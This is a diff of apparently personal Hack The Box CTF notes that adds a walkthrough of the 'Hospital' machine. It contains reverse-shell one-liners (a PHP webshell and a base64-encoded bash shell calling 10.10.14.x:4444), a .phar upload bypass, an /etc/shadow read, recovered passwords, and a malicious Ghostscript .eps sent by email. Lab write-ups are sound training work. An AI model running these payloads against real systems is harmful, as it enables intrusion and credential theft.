@@ -1,18 +1,6 @@
 # Medium\_machines
 
-## Agile
-
-### Reco
-
-### Weaponisation
-
-### Exploitation
-
-### User flag
-
-### Root flag
-
-![](https://hackmd.io/\_uploads/H1N6hTich.png)
+##
 
 ## OnlyForYou
 
@@ -207,7 +195,7 @@ nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd
 * Final Payload for shell.php file
   *   **`<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'") ?>`**
 
-      <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 #### Craft ZIP+PDF from php script
 
@@ -221,7 +209,7 @@ nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd
   * hex: **41 -> 00**
   *
 
-      <figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 upload file & go to generated URL with removed .pdf extension (onlyhttp://......./shell.php)
 
@@ -233,3 +221,174 @@ reserse shell should be obtained in nc -nlvp \<PORT>
 *
 
 ### Root flag
+
+## Hospital
+
+### Reco
+
+#### nmap
+
+`nmap 10.10.11.241 -sVC`
+
+* 22 SSH
+* 53 Domain - Simple DNS Plus
+* 88 Kerberos-sec
+* 135,2103,2105 MSRPC
+* 139 Netbios-ssn
+* 389,3268 LDAP
+* 443 HTTPS
+* .....
+* 3389 MS-WBT-Server
+* 8080 HTTP
+  * PHPSESSID = httponly flag not set
+  * potentially OPEN proxy
+* Host script results
+  * smb2
+    * sec-mode 311 (message signing enabled and required)
+
+#### Redirect
+
+`sudo nano /etc/hosts`
+
+* 10.10.11.241 hospital.htb
+
+#### Website
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>
+
+### Weaponisation
+
+#### Register & Login
+
+* 10.10.14.241:8080
+  * Register & Login
+    * I created: Tester:testtest
+
+#### Upload page
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>10.10.11.241:8080/index.php</p></figcaption></figure>
+
+#### dirb
+
+dirb http://10.10.11.241:8080/ /usr/share/wordlists/dirb/common.txt
+
+* /css
+* /fonts
+* /images
+* /js
+* /l
+* /m
+* /u
+* /uploads
+* /vendor
+* /w
+
+
+
+### Exploitation
+
+#### Reverse Shell crafting
+
+`sh -i >& /dev/tcp/<IP>/<PORT> 0>&1`
+
+* base64 encode
+  * `c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE=`
+* whole command for webshell
+  * `echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`
+
+#### p0wnyshell Tool
+
+* git clone https://github.com/flozz/p0wny-shell
+* after cloning, copy php file into phar extension
+  * cp shell.php shell.phar
+*   upload shell.phar to 10.10.11.241:8080/uploads
+
+    * success
+    * redirect to: 10.10.11.241:8080/uploads/shell.phar
+      * we have browser Reverse shell
+
+    <figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>
+
+`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`
+
+`nc -nlvp 4444`
+
+* we obtained reverse shell
+  * `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+  * `export TERM=xterm`
+  * `stty raw -echo; fg`
+
+`There is a user drwilliams`
+
+`/etc/shadow`
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+* Decode the PW hash
+
+### User flag
+
+#### drwilliams login
+
+ssh drwilliams@10.10.11.241
+
+* PW: qwe123!@#
+* unfortunatelly, no FLAG found
+
+{% embed url="https://10.10.11.241" %}
+
+`drwilliams:qwe123!@#`
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>
+
+* Sent -> there are .eps attachments
+  * lets craft malicious one
+    * [https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
+      * Ghostscript command injection
+
+CVE Exploit
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>Craft file.eps exploit</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>
+
+`git clone https://github.com/int0x33/nc.exe/`
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+update file.eps exploit with netcat...
+
+* upload exploit via answering email
+* nc -nlvp 4444
+
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>
+
+#### connect via RDP
+
+REMINNA&#x20;
+
+* user: drbrown&#x20;
+* IP: 10.10.11.241
+* PW: chr!$br0wn
+
+<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+### Root flag
+
+<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>
+
+we can see there is uploaded shell.php
+
+<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+access website uploaded file...
+
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:red;">**PWNED <3**</mark>
